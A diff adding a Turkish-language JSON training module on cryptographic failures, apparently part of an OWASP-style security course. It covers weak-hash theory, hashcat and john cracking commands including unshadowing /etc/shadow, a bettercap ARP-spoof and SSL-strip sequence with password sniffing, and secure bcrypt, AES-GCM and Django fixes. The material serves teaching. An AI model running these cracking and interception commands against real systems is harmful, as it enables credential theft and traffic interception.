@@ -1,0 +1,109 @@
+{
+  "id": "cryptographic-failures",
+  "slug": "cryptographic-failures",
+  "title": "A02 — Cryptographic Failures",
+  "subtitle": "Şifreleme Hataları ve Hassas Veri İfşası",
+  "description": "Zayıf şifreleme algoritmaları, düz metin hassas veri, SSL/TLS zafiyetleri, hash kırma, JWT güvensizlikleri.",
+  "icon": "🔑",
+  "order": 2,
+  "tags": ["şifreleme", "MD5", "SHA1", "SSL Strip", "HTTPS", "padding oracle", "hash cracking", "düz metin"],
+  "modules": [
+    {
+      "id": "crypto-intro",
+      "title": "Şifreleme Hataları Nedir?",
+      "description": "Hassas veri ifşası, zayıf algoritmalar, gerçek dünya örnekleri",
+      "difficulty": "beginner",
+      "duration": "15 dk",
+      "sections": [
+        {
+          "id": "theory",
+          "type": "theory",
+          "title": "Şifreleme Zafiyetleri",
+          "content": "**Cryptographic Failures** — eski adı \"Sensitive Data Exposure\" — şifreleme eksikliği veya zayıf uygulaması nedeniyle hassas verinin açığa çıkması.\n\n**Yaygın Hatalar:**\n| Hata | Neden Tehlikeli |\n|------|----------------|\n| HTTP (HTTPS değil) | Veri düz metin iletilir — MITM |\n| MD5/SHA1 ile parola hash | Gökkuşağı tablosu + GPU ile saniyeler içinde kırılır |\n| ECB modunda AES | Şifreli bloklar arasında desen oluşur — görüntü bile analiz edilebilir |\n| Salt'sız hash | Aynı şifre → aynı hash → bulk crack |\n| Zayıf/tahmin edilebilir anahtar | Sabit IV, sabit secret, kaynak kodunda anahtar |\n| Düz metin DB'de | Veri tabanı dump = tüm şifreler ele geçirildi |\n\n**Gerçek Dünya Örnekleri:**\n- **Adobe 2013:** 153 milyon kullanıcı — şifreler ECB AES ile şifrelenmiş (hash değil!) + hint düz metin\n- **LinkedIn 2012:** 6.5 milyon SHA1 unsalted hash — saatler içinde kırıldı\n- **RockYou 2009:** 32 milyon kullanıcı şifresi düz metin MySQL'de"
+        }
+      ]
+    },
+    {
+      "id": "hash-cracking",
+      "title": "Hash Kırma — MD5, SHA1, bcrypt",
+      "description": "Rainbow table, dictionary attack, hashcat ile hash kırma teknikleri",
+      "difficulty": "intermediate",
+      "duration": "25 dk",
+      "sections": [
+        {
+          "id": "commands",
+          "type": "commands",
+          "title": "Hash Tanıma ve Kırma",
+          "commands": [
+            {
+              "command": "# Hash türünü tanı:\nhashid 5f4dcc3b5aa765d61d8327deb882cf99\nhash-identifier 5f4dcc3b5aa765d61d8327deb882cf99\n\n# Hash boyundan tahmin:\n32 karakter = MD5\n40 karakter = SHA1\n64 karakter = SHA256\n$2y$... = bcrypt\n$6$... = SHA-512 (Linux /etc/shadow)\n$1$... = MD5 (Linux)\n$apr1$... = MD5-APR",
+              "description": "Hash türünü tespit et"
+            },
+            {
+              "command": "# Hashcat ile hash kırma:\n# MD5 dictionary attack:\nhashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt\n\n# SHA1:\nhashcat -m 100 -a 0 hash.txt /usr/share/wordlists/rockyou.txt\n\n# bcrypt (yavaş!):\nhashcat -m 3200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt\n\n# SHA-512 (Linux shadow):\nhashcat -m 1800 -a 0 hash.txt /usr/share/wordlists/rockyou.txt\n\n# Kural tabanlı (şifre + sayı kombinasyonu):\nhashcat -m 0 -a 0 hash.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule\n\n# Brute force (6 karakter, sayı+harf):\nhashcat -m 0 -a 3 hash.txt ?a?a?a?a?a?a",
+              "description": "Hashcat ile MD5/SHA1/bcrypt dictionary ve brute force saldırıları",
+              "tip": "-m parametresi: 0=MD5, 100=SHA1, 1400=SHA256, 3200=bcrypt, 1800=sha512crypt"
+            },
+            {
+              "command": "# john the ripper ile hash kırma:\njohn --wordlist=/usr/share/wordlists/rockyou.txt hash.txt\njohn --format=md5 --wordlist=rockyou.txt hash.txt\njohn --show hash.txt  # kırılan hashları göster\n\n# /etc/shadow dosyası kırma:\nunshadow /etc/passwd /etc/shadow > unshadowed.txt\njohn unshadowed.txt --wordlist=rockyou.txt\n\n# Online hash lookup:\n# https://crackstation.net — büyük rainbow table\n# https://hashes.com/en/decrypt/hash",
+              "description": "john the ripper ve online hash lookup araçları"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "ssl-tls",
+      "title": "SSL/TLS Zafiyetleri",
+      "description": "SSL Stripping, eski protokoller, zayıf cipher, sertifika hataları",
+      "difficulty": "intermediate",
+      "duration": "20 dk",
+      "sections": [
+        {
+          "id": "commands",
+          "type": "commands",
+          "title": "SSL/TLS Analiz ve Saldırılar",
+          "commands": [
+            {
+              "command": "# SSL/TLS yapılandırması analizi:\ntestssl.sh hedef.com\n# veya:\nnmap --script ssl-enum-ciphers -p 443 hedef.com\n# veya online:\n# https://www.ssllabs.com/ssltest/\n\n# Sonuçta dikkat et:\n# - SSLv3, TLSv1.0, TLSv1.1 → eski, güvensiz\n# - RC4, DES, 3DES cipher → zayıf\n# - HSTS yoksa → SSL stripping mümkün\n# - Certificate Transparency LOG → subdomain keşfi",
+              "description": "SSL/TLS yapılandırması güvenlik analizi"
+            },
+            {
+              "command": "# SSL Stripping (bettercap ile — MITM lab):\nbettercap -iface eth0\n# bettercap prompt'unda:\nnet.probe on\nset arp.spoof.targets 192.168.1.X\narp.spoof on\nset ssl.strip.hosts hedef.com\nssl.strip on\nnet.sniff on\n\n# HTTP trafiği dinle:\ntcpdump -i eth0 -A port 80 | grep -i 'password\\|pass\\|pwd'",
+              "description": "MITM ortamında SSL stripping ile HTTPS'i HTTP'ye düşür",
+              "warning": "Yalnızca kendi test ağında veya lab ortamında. Gerçek ağlarda yasadışı!"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "weak-crypto-examples",
+      "title": "Zayıf Şifreleme Örnekleri ve Düzeltme",
+      "description": "ECB vs CBC, salt kullanımı, modern güvenli algoritmalar",
+      "difficulty": "intermediate",
+      "duration": "15 dk",
+      "sections": [
+        {
+          "id": "commands",
+          "type": "commands",
+          "title": "Güvenli Şifreleme Uygulamaları",
+          "commands": [
+            {
+              "command": "# Parola hashleme — YANLIŞ vs DOĞRU:\n\n# ❌ YANLIŞ — MD5/SHA1 salt'sız:\npython3 -c \"import hashlib; print(hashlib.md5(b'password123').hexdigest())\"\n\n# ✅ DOĞRU — bcrypt (Python):\nimport bcrypt\nhashed = bcrypt.hashpw(b'password123', bcrypt.gensalt(rounds=12))\nprint(hashed)  # $2b$12$...\nbcrypt.checkpw(b'password123', hashed)  # True",
+              "description": "Parola hashleme — MD5 yerine bcrypt"
+            },
+            {
+              "command": "# AES şifreleme — ECB (KÖTÜ) vs GCM (İYİ):\n\n# ❌ ECB modu — deterministik, desen ortaya çıkar:\nfrom Crypto.Cipher import AES\ncipher = AES.new(key, AES.MODE_ECB)\n# Aynı plaintext → her zaman aynı ciphertext!\n\n# ✅ AES-GCM — authenticated encryption, her seferinde farklı:\nfrom Crypto.Cipher import AES\ncipher = AES.new(key, AES.MODE_GCM)\nnonce = cipher.nonce  # kaydet!\nciphertext, tag = cipher.encrypt_and_digest(plaintext)\n# Hem şifreleme hem bütünlük doğrulaması",
+              "description": "AES ECB vs GCM — deterministik şifrelemenin tehlikesi"
+            },
+            {
+              "command": "# HTTPS zorla (Django):\n# settings.py:\nSECURE_SSL_REDIRECT = True\nSECURE_HSTS_SECONDS = 31536000  # 1 yıl HSTS\nSECURE_HSTS_INCLUDE_SUBDOMAINS = True\nSECURE_HSTS_PRELOAD = True\nSESSION_COOKIE_SECURE = True\nCSRF_COOKIE_SECURE = True\n\n# Cookie'de HTTPOnly + Secure:\nSESSION_COOKIE_HTTPONLY = True\nSESSION_COOKIE_SAMESITE = 'Strict'",
+              "description": "Django ile HTTPS zorunluluğu ve güvenli cookie ayarları"
+            }
+          ]
+        }
+      ]
+    }
+  ]
+}
